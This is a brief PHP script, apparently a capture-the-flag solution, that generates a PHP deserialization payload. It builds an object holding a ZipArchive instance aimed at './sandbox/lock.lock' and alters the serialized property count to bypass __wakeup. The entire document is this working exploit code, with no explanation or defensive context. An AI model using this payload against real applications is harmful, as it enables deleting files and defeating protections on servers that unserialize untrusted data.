<?php
class Jesen
{

    public $filename = './sandbox/lock.lock';
    public $content = 8;
    public $me;
}
$a = new  Jesen();
$zip  = new  ZipArchive;
$a->me = $zip;
$b = serialize($a);
$b = str_replace('":3:', '":4:', $b);
echo $b;
echo "\n";
